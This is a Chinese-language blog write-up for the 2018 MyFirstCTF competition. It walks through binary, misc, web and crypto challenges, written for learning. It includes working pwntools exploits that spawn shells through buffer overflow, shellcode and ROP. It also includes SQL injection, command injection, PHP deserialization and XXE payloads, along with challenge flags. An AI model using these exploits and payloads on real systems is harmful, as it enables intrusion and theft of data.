---
title: MyFirstCTF online
tags:
  - MyFirstCTF - Write-up
categories:
  - Write-up
  - MyFirstCTF
lang: zh-tw
author: 'Racterub, Howpwn, Ayumi'
date: 2018-04-10 15:32:30
---




# Binary

## Soeasy

```
第一堂逆向工程課
課堂老師出了一題簡單的程式要比對輸入的資料是否滿足某條件，聰明的你應該很快就解出答案。

https://bit.ly/2GM36Fa
```

從檔案名稱可以看出題目要考簡單的逆向工程，
比較快速的解法是直接下 strings 查看可印出的字符串，再利用 grep 快速搜尋 FLAG 關鍵字

![](https://i.imgur.com/tXhTnmG.png)

其實也可以用 IDAPro 看偽代碼，可以發現程式執行不管輸入什麼字都不會印出 FLAG。

![](https://i.imgur.com/xxjF970.png)

### MyFirstObfuscatedCode

```
日本風格的javascript變裝術

軟體保護技術中,代碼混淆是一種常見的技術。
wikipedia上說明"代碼混淆是將電腦程式的代碼，轉換成一種功能上等價，但是難於閱讀和理解的形式的行為"。

這是你的第一堂代碼混淆課,請嘗試解出附件。

提示1: 開始了解代碼混淆,請看維基百科的說明 :
https://zh.Wikipedia.org/zh-tw/代碼混淆
提示2: "功能上等價"就是可以執行,答案會和原始程式執行所得到的答案一樣。


https://bit.ly/2GpFvqA
```

稍微 Google 一下關鍵字 `javascript 混淆 顏文字`，應該就會知道這是 aaencode，所以丟 aaencode Decoder 就可以解出來了。

另外一種比較常見的混淆還有 jsfuck ，曾被當作 [AIS3-2015-Web2](https://www.30cm.tw/2015/08/ctf-ais3-write-up.html) 的考題。

更多關於 JavaScript 混淆的資訊請 [點我](https://blog.techbridge.cc/2016/07/16/javascript-jsfuck-and-aaencode/)

## Pwntools

想辦法 parse 題目成這種格式：`a + b`
之後使用 python 的 eval 就可以直接算出答案了

## Return

```
控制暫存器rip等同控制世界!

提示1 : 經典的buffer overflow漏洞
提示2 : 你可透過劫持當下function的return address來控制程式執行指針至目標位置。

nc 140.110.112.29 2114

https://bit.ly/2GrDkmq
```

簡單的 ret2text ，透過 Stack overflow 蓋掉 gets() 的 Return Address，並將指令指針(RIP)指向 you_cant_see_this_its_too_evil()，並且成功 getshell。

直接上 exploit：

{% codeblock lang:python %}
#! /usr/bin/python
# -*- coding: utf-8 -*-
from pwn import *

host = "140.110.112.29"
port = 2114

padding = 56
evil = 0x00000000004006b6

r = remote(host, port)
r.recvuntil("\n")

payload = cyclic(padding) + p64(evil)

r.sendline(payload)

r.interactive()
# cat /home/reutrn/flag
{% endcodeblock %}

更多 ret2text 的學習資源請 [點我](https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/basic_rop/#ret2text)

## Shellcode

```
厲害的駭客都擅長shellcoding

提示1:題目將輸入直接當machine code執行
提示2:撰寫組語，以及提交正確功能的shellcode。

nc 140.110.112.29 2115

https://bit.ly/2Gtc1Ix
```

- 有 memory leak (input buffer address)
- 沒開 NX 保護
- 有 RWX Segment

所以我們要將可以拿到 shell 的 Shellcode 透過一開始的 gets() 放進我們已知記憶體位置的 input buffer，在利用前面所學到的 ret2text 的技巧，蓋掉 gets() 的 return address，讓 RIP 指到 input buffer。

具體 exploit 如下：

{% codeblock lang:python %}
#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *

host = "140.110.112.29"
port = 2115

context.arch = "amd64"
r = remote(host, port)
padding = 120

input_buf = int(r.readline().split(" ")[6], 16) # 將 buf 位置抓回來

shellcode = asm(shellcraft.amd64.linux.sh())

payload = shellcode.ljust(padding, "A") + p64(input_buf)

r.sendline(payload)

r.interactive()
# cat /home/shellcodde/flag
{% endcodeblock %}


由於 NX 保護沒開，所以 input buffer 具有可執行權限，導致我們可以成功 Getshell。

## ROP

原本只以為是基本的 ROP ，後來用 gdb 追才發現先有一個 `strlen` 檢查輸入
![](https://i.imgur.com/Ihctekk.png)
後來 google 了一下，發現 `\x00` 可以直接繞過 `strlen` ，後面的解法就很正常了

Exploit:
{% codeblock lang:python %}
#!/usr/bin/env python

from pwn import *

r = remote('0.0.0.0', 8888)
context.arch = 'amd64'

payload = ''
payload += 'a'*29 + '\x00' + 'a'*10

mov_rdi_rsi = 0x47a712
pop_rsi = 0x401617
pop_rdi = 0x4014f6
pop_rax_rdx_rbx = 0x478726
buf = 0x6ca080
syscall = 0x4673c5

payload1 = flat([pop_rdi, buf, pop_rsi, '/bin/sh\x00', mov_rdi_rsi, pop_rsi, 0, pop_rax_rdx_rbx, 0x3b, 0, 0, syscall])

r.recvuntil('\n')
#raw_input('##############')
r.sendline(payload + payload1)
r.interactive()
{% endcodeblock %}

## memo_manager

先上 Exploit:
{% codeblock lang:python %}
from pwn import *

context.log_level = "debug"

def echo(data):
    r.recvuntil('Your choice:')
    r.send('1')
    r.recvuntil('What do you want to say:')
    r.send(data)
    r.recvuntil('You said: ')
    return r.recvline()

def store(index, data):
    r.recvuntil('Your choice:')
    r.send('2')
    r.recvuntil('Which one do you want to store in (1 , 2 , 3)?:')
    r.send(str(index))
    r.recvuntil("What do you want to store in mem page %d :" %index)
    r.send(data)


def show(index):
    r.recvuntil('Your choice:')
    r.send('3')
    r.recvuntil('Which memo page do you want to see (1 , 2 , 3)?:')
    r.send(str(index))
    r.recvuntil('memo page %d : ' %index)
    return r.recvline()


def edit(index, data):
    r.recvuntil('Your choice:')
    r.send('4')
    r.recvuntil('Which memo page do you want to edit (1 , 2 , 3)?:')
    r.send(str(index))
    r.recvuntil('Edit memo page 4 :')
    r.send(data)

r = remote('ctf.racterub.me', 3008)

atoi_off = 0x36e80
tmp = echo("a"\*0x48).strip()+"\\x00"\*8
atoi = u64(tmp\[0x48:0x50\])-16
libc = atoi - atoi_off
gadget = libc + 0x45216
log.info("atoi: {}".format(hex(atoi)))
log.info("libc: {}".format(hex(libc)))
log.info("gadget: {}".format(hex(gadget)))

store(1, "a"*0x10)
store(2, "a"*0x10)
store(3, "a"*0x10)
edit(1,"a"*0x10)
edit(3, "a"*0x19)
tmp = "\\x00"+show(3)\[0x19:0x19+7\]
canary = u64(tmp)
log.info("canary: {}".format(hex(canary)))
edit(3, "a"*0x10+"\\x00")
edit(1, "a"*0x10)
edit(3, "a"*0x18+p64(canary)+p64(canary)+p64(gadget))
r.recvuntil('Your choice:')
r.send('5')
r.interactive()
r.close()
{% endcodeblock %}


# Misc

## ASCII
```
ASCII(American Standard Code for Information Interchange)全名為美國資訊交換標準代碼，是基於拉丁字母的電腦編碼，前期主要用於表示現代英文，擴展版本後甚至支援其他部分西歐語言。

最著名的就是Ascii Table，請對照Ascii Table解碼下列十進位資料:

77 121 70 105 114 115 116 67 84 70 123 90 50 79 97 115 54 55 65 69 54 68 117 65 51 73 50 112 56 69 53 125
```

丟 ASCII Decoder 秒解。
請愛用：https://www.asciitohex.com/

## Secrets in PDF
```
第一線資安工程師在攻擊事件現場蒐集到犯罪所遺留的文件，身為鑑識專家的你請協助我們完成找出隱藏在資料裡的資料。

https://bit.ly/2GpIcbG
```

真的是有夠87的一題XDDD
直接下載下來，然後用滑鼠反白整張 PDF 就好了。(在網頁版上開 PDF 反白可能沒效喔)

害我想這麼久，真正的第一線資安工程師不會搞這麼無聊的東西好嗎XDDD

## Secret of Metadata

```
這是一張可疑圖片，身為鑑識專家的你請協助我們完成者找出隱藏在圖片裡的資料。

https://bit.ly/2Go1CBM
```

用 [StegoSolve](http://www.caesum.com/handbook/Stegsolve.jar
) 打開圖片，Analyse -> File Format 慢慢翻，會找到 MyFirstCTF 字樣，
我記得 FLAG 在中間，FLAG沒有空白。

`另解：Exiftool 可直接找到 flag`

## Secret images in pictures


```
另一張可疑圖片。

身為鑑識專家的你，發現圖片大小異常，很可能還藏著另一張圖片，請協助我們完成者找出隱藏在圖片裡的圖片。

提示1 : 你如何知道圖片藏有圖片??  
提示2 : dd是一個linux平台上好用的工具，可以幫助你解題。

https://bit.ly/2EaSFFR
```


binwalk + dd 老梗了，直接上 ShellScript 吧
`dd if=Secret_pic.png of=flag.png bs=1 skip=1364137`
詳解請 [點我](https://ctf-wiki.github.io/ctf-wiki/misc/prefix/#binwalk)


## Sniffering

```
Insecurity 銀行的遠端連線伺服器發現遭受到駭客植入木馬，銀行的資安人員通知MyFirstSecurity資安技術服務工程師到場進行蒐證。
MyFirstSecurity資安技術服務工程師在現場收集網路封包後，建議Insecurity銀行採用安全的遠端連線。

請你找出網路封包中的flag。

提示1: 遠端連線使用的協定中使用明文傳輸容易遭致網路竊聽

https://bit.ly/2GZmg8h
```

開啟 wireshark，打開 Broken_session.pcap
對其中一條 TCP 傳輸按滑鼠右鍵， folllow -> TCP stream ，就可以看到FLAG。

![](https://i.imgur.com/dFyb1WB.png)

## Linux-hidden file (linux-1)

```
資安鑑識人員偵查一台伺服器，發現在/home/lab目錄有重要資料被隱藏，使鑑識人員搜查情資不易，你能夠連至這台伺服器幫忙尋找嗎?

SSH 資訊
IP : 140.110.112.29
Port: 2200

帳號 : lab
密碼 : lab
```

考你會不會使用 ssh 、怎麼找出隱藏的檔案，在 Linux 中，隱藏的檔案的檔名前面都會有個 "."

{% codeblock lang:shell %}
 howpwn@nb ~/WriteUp  ssh lab@140.110.112.29 -p 2200
}

lab@140.110.112.29's password:
lab@b45a8fa24aa9:~$ ls -al
total 24
drwxr-xr-x 1 root root 4096 Apr  1 04:31 .
drwxr-xr-x 1 root root 4096 Mar 23 00:46 ..
-rw-r--r-- 1 lab  lab   220 Mar 23 00:46 .bash_logout
-rw-r--r-- 1 lab  lab  3771 Mar 23 00:46 .bashrc
-rw-rw-r-- 1 root root   33 Mar 26 11:32 .hidden_secret
-rw-r--r-- 1 lab  lab   655 Mar 23 00:46 .profile
lab@b45a8fa24aa9:~$ cat .hidden_secret
MyFirstCTF{aowMaSNSRgUvkp6Ehb6R}
{% endcodeblock %}

## Linux-find file (linux- 2)

```
檢察官終於使嫌犯說出帳密及他把重要的secret檔案放在遠端伺服器，但卻忘了檔案位置，身為資安鑑識人員的你能夠連線至該伺服器，幫忙偵蒐嗎?

SSH伺服器資訊
IP : 140.110.112.29
Port: 2200

帳號 : lab
密碼 : lab
```

這次就是考你怎麼 find 檔案了

{% codeblock lang:shell %}
lab@b45a8fa24aa9:~$ find / -name "secret" # 從根目錄底下開始搜尋 secret
...
...
/opt/secret
...
...
lab@b45a8fa24aa9:~$ cat /opt/secret
MyFirstCTF{baLc2hpIssVsU7p5boud}
{% endcodeblock %}

## InSecureDataTransfer

```
MyFirstSecurity資安工程師在攻擊事件現場側錄到遺留有犯罪的可疑封包。
身為鑑識專家的你請協助我們完成者找出隱藏在資料的秘密。

提示1 : Wireshark 可以幫助你

https://bit.ly/2GtMm2h
````
在觀察一下之後發現是 FTP 傳檔過程
追蹤一下就可以發現有傳送一個檔 `secret.txt`
![](https://i.imgur.com/NmLnHGK.png)



`另解 1`
`strings File_transfer.pcap | grep "CTF"`

`另解 2`
在 wireshark 搜尋欄打上 `tcp contains CTF`
![](https://i.imgur.com/dWgNrtF.png)



## calculator (ppc-1)

```
你能幫我解一些方程式嗎？

nc 140.110.112.29 5119

(連線範例在 https://bit.ly/2IiTLBT )
```

利用 Pwntools 很好解，直接上 Script：
{% codeblock lang:python %}
#! /usr/bin/python
# -*- coding: utf-8 -*-
from pwn import *

host = "140.110.112.29"
port = 5119

r = remote(host, port)

r.readline() # ===== Welcome to the magic calculator =====
r.readline() # We got some equations here, but the operator is missing.
r.readline() # Can you help us?

for i in range(1,101):
    r.readline() # ----- wave 1/100 -----
    Formula = r.readline()
    # 開始分別抓取元素 (Formula是字串型態，加上 int 轉成數字型態)
    First_element = int(Formula.split(' ')[0])
    Second_element = int(Formula.split(' ')[2])
    Result = int(Formula.split(' ')[4])
    # 開始進行比對，並且找出正確的運算子
    if First_element + Second_element == Result:
        r.sendline("+")
    elif First_element - Second_element == Result:
        r.sendline("-")
    elif First_element * Second_element == Result:
        r.sendline("*")
r.interactive()
{% endcodeblock %}



# Web

## Developer Tools

```
資安人員在某公司的網站上發現網站開發人員因為方便開發，而將重要資訊列在前端程式碼中，你能快速的找到這致命的錯誤嗎?

提示1: MyFirstCTF{xxxxxxxxxxx}
提示2: 你清楚知道base64編碼與解碼的原理嗎?
參看維基百科的說明
https://zh.wikipedia.org/wiki/Base64

請連結以下網址:
http://140.110.112.29:1001/
```

Ctrl + U 或滑鼠右鍵檢視網頁原始碼：

{% codeblock lang:html %}
<!--base64 me -->
<!-- TXlGaXJzdENURntTcHpRRGZLMHJxbDE2WlNZd3d3V30= -->
{% endcodeblock %}

把它丟 Base64 Decoder 就好，請愛用 https://www.asciitohex.com/

## robots.txt

```
robots.txt是一種文字檔案，它說明網站有哪些檔案及哪些目錄是不希望網路搜尋引擎去爬析。
但駭客卻常透過robots.txt竊取機密資訊。

提示1 :參看維基百科的解說有助於你的理解: [https://zh.wikipedia.org/wiki/Robots.txt](https://zh.wikipedia.org/wiki/Robots.txt)
提示 2:你應該知道robots.txt存放在網站的放置

請連結以下網址並完成測試:
[http://140.110.112.29:1002/](http://140.110.112.29:1002/)
```

前往 http://140.110.112.29:1002/robots.txt
發現洩漏 http://140.110.112.29:1002/admin/ ，且可造訪。

## SQL injection

```
長期高居OWASP TOP 10第一名的injection flaw是涵蓋許多漏洞的總稱，而其中SQL隱碼攻擊(SQL injection)更是非常著名的網站漏洞，這也是網站安全與威脅的第一堂必修課。

提示1: 相關說明請參看
[https://www.owasp.org/index.php/Top\_10-2017\_Top_10](https://www.owasp.org/index.php/Top_10-2017_Top_10)
A1:2017-Injection

為了證明你已經開始熱情學習資安技術，請你到下列網站並使用SQL injection來找到flag:
http://140.110.112.29:1003/
```

```
Username = admin'#
Password = admin'#
```
成功登入管理員帳號並取得 FLAG

## Command injection

```
InsecureTeleCOM公司為增加使用者的忠誠度特提供一系列的網路服務，其中一項便是佈建網站來提供dns線上查詢功能。
為增加其網站安全，InsecureTeleCOM公司委託MyFirstSecurity資安團隊針對其網站進行滲透測試，MyFirstSecurity資深滲透測試專家很快就檢測出該服務具有長期高居OWASP TOP 10第一名的injection flaw。
具有高度資安學習熱情並將以安全專家捍衛家園作為終身職志的志明由於才剛入門，因此嘗試許多SQLi的滲透測試，但卻無所獲。
MyFirstSecurity資深滲透測試專家看到志明的積極與主動，感動之餘便告訴志明有許多injection技術，建議他看看Command injection的漏洞。
志明再度發揮他積極與主動的精神，上網並測試許多類型的OS Command injection，在他詳細的簡報與深度的演講中，已經讓人看到眾所期待的新星正在發光。

故事講完後 ，就輪到你來努力!請連結以下網址並完成相關測試:
[http://140.110.112.29:1004/](http://140.110.112.29:1004/)
```

利用分號進行命令注入，
- ;ls -al
    - 列出 index 所在資料夾的所有檔案
- ;cat ../flag
    - 成功得到FLAG

## Flashing_Redirect

```
快閃式的重導向(Redirect)總是讓你眼花!

捉住稍縱即逝的機會是你人生必修課題，參加競賽的你已經踏出第一步!恭喜恭喜!
接著你要學習捉住稍縱即逝的網頁。

請連結以下網址:
[http://140.110.112.29:1005/](http://140.110.112.29:1005/)
```

HTTP 302 之類的吧，跟 AIS3-2017-Web1 一樣。
{% codeblock lang:shell %}
curl http://140.110.112.29:1005/jump.php
<meta http-equiv="refresh" content="0; url=jump_again.php">

curl http://140.110.112.29:1005/jump_again.php
MyFirstCTF{VTmoWAGaiI6kavkN86u0}
恭喜你抓到flag了!!!
{% endcodeblock %}

## New HTTP method

```
你對HTTP狀態碼(HTTP Status Code)及HTTP請求方法(HTTP request methods)了解嗎?熟讀兩者也是資訊安全重要的一環，前者表示該網頁目前的狀態，後者為HTTP協定中定義許多種不同的請求方法，回應的資訊也不同，最常使用的請求方法如GET、POST。
請找出該網站規定了什麼請求方法，從回饋資訊中找出flag。

提示: Curl tools

請連結以下網址:
[http://140.110.112.29:1006/](http://140.110.112.29:1006/)
```

一點開網頁就是 HTTP 501 Not Implemented，表示說我們用錯 HTTP Method。
所以我們可以先用 OPTIONS 這個 Method 來查詢到底有哪些 Method 可以使用。

{% codeblock lang:shell %}
curl -v -X OPTIONS http://140.110.112.29:1006/index.php

*   Trying 140.110.112.29...
* Connected to 140.110.112.29 (140.110.112.29) port 1006 (#0)
> OPTIONS /index.php HTTP/1.1
> Host: 140.110.112.29:1006
> User-Agent: curl/7.47.0
> Accept: */*
>
< HTTP/1.1 200 OK
< Date: Sun, 01 Apr 2018 07:16:37 GMT
< Server: Apache/2.4.7 (Ubuntu)
< X-Powered-By: PHP/5.5.9-1ubuntu4.22
< Allow: GiveMeFLAG,OPTIONS
< Content-Length: 0
< Content-Type: text/html
<
* Connection #0 to host 140.110.112.29 left intact
{% endcodeblock %}

可以看到伺服器可以接收 GiveMeFLAG,OPTIONS 這些 Methond，明顯看出有個 Methond 很奇怪，所以我們試著連上去看看：

{% codeblock lang:shell %}
curl -v -X GiveMeFLAG http://140.110.112.29:1006/index.php

*   Trying 140.110.112.29...
* Connected to 140.110.112.29 (140.110.112.29) port 1006 (#0)
> GiveMeFLAG /index.php HTTP/1.1
> Host: 140.110.112.29:1006
> User-Agent: curl/7.47.0
> Accept: */*
>
< HTTP/1.1 200 OK
< Date: Sun, 01 Apr 2018 07:17:37 GMT
< Server: Apache/2.4.7 (Ubuntu)
< X-Powered-By: PHP/5.5.9-1ubuntu4.22
< Content-Length: 32
< Content-Type: text/html
<
* Connection #0 to host 140.110.112.29 left intact
MyFirstCTF{VjTUSUqs970RW8sKfTjS}
{% endcodeblock %}

成功 GetFLAG。



## GuessingAdminSession

```
滲透測試專家在測試InsecurBank的網站系統時，發現用來認證登入的session不夠嚴謹，很容易被猜出session來。證明你有能力善用工具來登入設計不良的網站取得管理者(admin)權限!

帳號:barry
密碼:barry

帳號:clara
密碼:clara

提示1: 你知道如何攔截並修改封包嗎?
提示2: burpsuite會對你有所幫助
提示3: 請嘗試登入admin帳號
提示4: 相關說明請參看
[https://www.owasp.org/index.php/Top\_10-2017\_Top_10](https://www.owasp.org/index.php/Top_10-2017_Top_10
A2:2017-Broken Authentication

請連結以下網址進行解題:
[http://140.110.112.29:1007/](http://140.110.112.29:1007/)
```

猜謎題(?
如果用 barry 登入的話，barry 的 session 是：
PZgebJryZaTvNvrFbgsreBYty
如果想要以 admin 的身份登入的話，session 就需要是：
PZgeaJryZdTvNvmFbgsieBYtn
為什麼？因為：
XXXXaXXXXdXXXXmXXXXiXXXXn

## SSTI

tplmap

## To serialize or Not to serialize

```
php反序列化漏洞，php中有兩個函數serialize()和unserialize()，serialize函數可以將物件轉換成字串，儲存物件的值方便之後的傳遞與使用，unserialize函數能夠將字串轉換回原來的值。

如當傳給unserialize()的參數可控制時，可以蓄意輸入一個惡意構造的序列化字串，從而控制對象內部的參數甚至是函數造成遠端惡意攻擊。

請連結以下網址:
http://140.110.112.29:1009/
```

PHP反序列化漏洞 + Command inject

漏洞主要發生原因是使用者可以控制序列化的內容，導致反序列化時在 magic function 內讓我們可以做一些壞壞der事。

這邊先科普一下重要的 Magic Function：
- __construct()
    - 物件被 new 時會自動呼叫，但 unserialize() 時不呼叫
- __destruct()
    - 物件被銷毀時自動呼叫
- `__wakeup()`
    - unserialize() 時自動呼叫
- __sleep()
    - 被 serialize() 時自動呼叫



可以用以下產生 Payload：
{% codeblock lang:php %}
class MyFirstCTF {
	protected $test = ";cat T*"; // command inject
	function __wakeup() {
		print "Wake up yo!<br>";
		system("echo ".$this->test);
	}
}
echo serialize(new MyFirstCTF());
{% endcodeblock %}

這邊需要注意不同的變數範圍會有不同的序列化結果
- Public $test
    - O:10:"MyFirstCTF":1:{s:4:"`test`";s:5:"6l0ry";}
- Private $test
    - O:10:"MyFirstCTF":1:{s:16:"`MyFirstCTFtest`";s:5:"6l0ry";}
- Protected $test
    - O:10:"MyFirstCTF":1:{s:`7`:"`%00*%00test`";s:5:"6l0ry";}

\x00 是不可視字元，所以記得要 URL encode 上去。不要打 \x00 上去啊！這不是 Binary XDD

所以最後 Payload 應該要長的像這樣：
http://140.110.112.29:1009/index.php?str=O:10:"MyFirstCTF":1:{s:7:"%00*%00test";s:7:";cat%20T*";}


## XXE
```
OWASP在2017年提出最新版，其中包含了 A4-XML External Entities(XXE)
詳情請至 : [https://www.owasp.org/index.php/Top\_10-2017\_Top_10](https://www.owasp.org/index.php/Top_10-2017_Top_10)

XXE(XML External Entity)漏洞，也被稱為XML外部實體注入攻擊，主要發生在網站解析XML輸入時，沒有禁止外部實體的載入進而造成的安全漏洞。

請問你是否對XXE已了解?

觀察完程式碼後，請使用XXE Attack找出flag。

請連結以下網址:
[http://140.110.112.29:1010/](http://140.110.112.29:1010/)
```

NOPE
我還不太會解釋，其他人先幫我寫ㄅ，下面給你 Request Body

Request Body：
```
GET /?CTF=Password147186970! HTTP/1.1
Host: 140.110.112.29:1010
Cache-Control: max-age=0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6
Cookie: _ga=GA1.4.265009891.1522486838; _gid=GA1.4.566285874.1522486838; PHPSESSID=PZgebJryZaTvNvrFbgsreBYty
Pragma: akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace
Connection: close

<!DOCTYPE howpwn[
    <!ENTITY xxe SYSTEM "file:///flag">
]>
<root><MyFirstCTF>&xxe;</MyFirstCTF></root>
```

# Crypto


## 凱撒密碼

```
凱撒密碼(Caesar cipher)將加密前的字串按照一定的數目向左或向右移動，替換出來的字串就成為密文。這是古典密碼最知名的加密方式也是破密分析第一堂課。

請破解以下凱薩密碼:
TfMpyzaJAM{QBKqtdsgVWfBypOiwaYk}

提示1:答案格式 : MyFirstCTF{xxxxxxxxxxx}
提示2:線上資源或是使用python都可以快速解出答案
提示3:嘗試看看brute force解題
```

凱薩密碼用窮舉法最好破解，最多只需要破解 25 次即可得到明文。
https://planetcalc.com/1434/

## Transposition ciphers

```
資安人員在InsecureBank做資安健檢，發現某台電腦存在可疑的程式在深夜固定時間都會送出一些特定封包給特定IP，顯示似乎已遭到駭客植入木馬。在網路封包中經常發現底下附件的通關密語，內容看似亂碼又似乎有規則性，聰明的你能分辯出正確的訊息嗎?

提示1 : 答案格式 : MyFirstCTF{xxxxxxxxxxx}
提示2 : 答案格式本身就是提示
<br>
題目：
bcvqMeqacytqazFigwiiobxrrrtuiszahftreqcCreqcTreqcFkgd4{bnjrYwgk8OgbceUrwqrkfvbmntewsojklowhmkoHooyfovbnkwii87trfghonakidutfbeghk9co987r5tfbyhjiopo087ttfcvio087tghk9}
```

這題其實蠻有趣的，只要眼睛夠尖就可以發現密文有些端倪，
你會發現在密文中，每 4 個字元就會出現一個明文字元，
依照這種節奏，就可以找出明文字串了。

這邊有個[工具](http://tholman.com/other/transposition/)可以快速驗證是不是轉置密碼，只是我認為不是最好的工具就是了。 (Proposed Key length = 5)


## XOR Cipher

```
對稱式密碼中常用xor運算，廷廷宣稱他把一支程式用xor加密了，誰都打不開。
你應該可以證明他錯了!

提示1:你應該清楚xor運算的特色 ，請參看維基百科的說明:https://en.wikipedia.org/wiki/Exclusive_or
當然你可以點選中文解說

提示2:你必須要先算出解密用的key。

https://bit.ly/2pXDWsV
```

比較少看過把執行檔拿來做 XOR，推薦使用 [XOR Cracker](https://wiremask.eu/tools/xor-cracker/) 解比較快。

Key Length 是 10、Keys 是 "MyFirstCTF"，把解密檔案下載下來，
下載下來後發現是壞掉的執行檔，可以使用 soeasy 題目使用到的技巧把可打印字符串倒出來，
然後你就會看到 FLAG 了。

`另解`
利用 `xortool` 找到 key length
![](https://i.imgur.com/OOslepO.png)
之後就可以用 xortool 秒解了
![](https://i.imgur.com/e0u47z6.png)
最後的執行檔
![](https://i.imgur.com/M2QYkQ3.png)



## HashingService

```
維基百科說"雜湊函式(或雜湊演算法，又稱雜湊函式，英語：Hash Function)是一種從任何一種資料中建立小的數字「指紋」的方法。
雜湊函式把訊息或資料壓縮成摘要，使得資料量變小，將資料的格式固定下來。該函式將資料打亂混合，重新建立一個叫做雜湊值（hash values，hash codes，hash sums，或hashes）的指紋。雜湊值通常用一個短的隨機字母和數字組成的字串來代表。好的雜湊函式在輸入域中很少出現雜湊衝突。"

SHA-1(Secure Hash Algorithm 1)是一種密碼雜湊函式，InsecureTestingCenter設計Sha1Me服務讓你連線測試你所算出的答案。

請你連線以下位址正確回答問題並取得flag：
nc 10.141.0.210 4112

提示1:有關hash加密雜湊函數說明，請參看維基百科的說明:
https://en.wikipedia.org/wiki/Hash_function
提示2:python支援SHA-1的套件可以讓你很快解出答案。

連線範例：
Sha1Me:P3bHzH5pcrGoHF7PGEee
Give me your input:
```

老實說這題有點意義不明，就把 "P3bHzH5pcrGoHF7PGEee" 用[線上工具](http://www.sha1-online.com/)作 SHA-1 得到 "d2399fe795d2ba29f4947ac7d0be614c2190bbf3"，然後再 nc 上伺服器把 Hash 過的資料丟給它就好，

然後它就給你 FLAG 了。

我還以為要 Hash 100次之類的勒！

## MD5 collision

```
MD5加密主要是確保資訊完整一致，時常被使用在密碼加密中。但PHP處理MD5時，如使用PHP弱類型比較的程式碼容易產生md5碰撞(md5 collision)。

請你使用md5 collision原理來登入以下網址取得flag：

請連結以下網址:
http://10.141.0.210:4113/

提示1:有關MD5加密雜湊函數，請參看維基百科的說明:
https://en.wikipedia.org/wiki/MD5
提示2:你可以上網看看md5 collision demo
https://www.mathstat.dal.ca/~selinger/md5collision/
<br>
同樣題型不同比賽：http://120.114.62.45:3004/
教育部架設之另一平台，請勿做非法網路攻擊。
網站可能隨時關站，因為這又不是我架的 (´・ω・`)
```

PHP 弱類型比較老梗。簡單做個 Demo：
{% codeblock lang:php %}
"0e1234" == "0e5678" // True
"0e1234" === "0e5648" // False
// 兩個等於(相等)與三個等於(全等)的差別
// 相等首先會將被比較的變數強制轉化為比較變數的同一類型，再去比較數值
// 全等首先判斷類型，如果不同直接返回 False，再去比較數值。
// 在進行比較時，如果遇到了 "0e數字數字數字" 這種字串，會將 "0e" 解析成科學符號
// 所以第一個例子會因為兩者皆為 0 而導致返回 True
{% endcodeblock %}

所以這題的解法只要隨便找個字串經過 MD5 後為 0e 開頭的即可繞過登入密碼的限制。
以下這些字串都可以：
```
MD5("QNKCDZO") = 0e830400451993494058024219903391
MD5("s878926199a") = 0e545993274517709034328855841020`
MD5("s155964671a") = 0e342768416822451524974117254469
```



## SHA1 collision

```
2017年2月23日google在底下網址宣稱已經成功攻破sha1
https://security.googleblog.com/2017/02/announcing-first-sha1-collision.html

你知道這會有甚麼問題嗎？

題目網址中顯示PHP原始碼使用SHA1函示對使用者輸入的密碼進行hash，請你使用根據sha1 collision原理登入以下網址取得flag:

請連結以下網址:
http://10.141.0.210:4114/

提示1:SHA1為美國國家安全局（National Security Agency，NSA）所設計並於1995年發表的加密雜湊函數，隨後亦成為美國聯邦資料處理標準。有關SHA1加密雜湊函數，請參看維基百科的說明:
https://zh.wikipedia.org/wiki/SHA-1
提示2:SHAttered attack的資料請參看
https://shattered.io/

同樣題型不同比賽：http://120.114.62.45:4114/index.php
教育部架設之另一平台，請勿做非法網路攻擊。
網站可能隨時關站，因為這又不是我架的 (´・ω・`)
```

什麼？你以為真的要你碰撞兩組 SHA-1 嗎？

![](https://i.imgur.com/goTJBdV.jpg)

跟 MD5 collision 一樣，只要找出符合 SHA-1 後是 0e 開頭的資料即可
我使用 "10932435112"

## RSA

```
RSA加密演算法是著名的非對稱加密演算法，在電子商業中RSA加密被廣泛使用。資安人員在某間公司發現他們的產品使用RSA加密技術時，RSA某些參數設計不夠嚴謹很容易被破解。

這是你的第一堂RSA破密分析作業。聰明的你能解出明文嗎?

提示1 :請參看維基百科RSA加密演算法的說明 :
https://en.wikipedia.org/wiki/RSA_(cryptosystem)
當然你可以點選中文解說
提示2：n很小可以先分解出p和q質數。你可以善用線上資源解質因數分解。　
提示3：解出來的明文必須是MyFirstCTF{xxxxxxxxxxx}答案格式。

https://bit.ly/2EbQ52g
```

n 可以直接使用 [factordb.com](http://factordb.com) 解出質數

以下因為題目遺失，將使用類似題型講解

{% codeblock lang:python %}
#!/usr/bin/env python

import libnum
import gmpy2

n = 23292710978670380403641273270002884747060006568046290011918413375473934024039715180540887338067
e = 11
c = 10342881148737891804821388667541809359978248929587283926428086704207154183086620548133548060830

\# p\*q\*r = n
p = 26440615366395242196516853423447
q = 27038194053540661979045656526063
r = 32581479300404876772405716877547

d = gmpy2.invert(e, (q-1)*(p-1)*(r-1))
m = pow(c, d, n)
print libnum.n2s(m)
{% endcodeblock %}
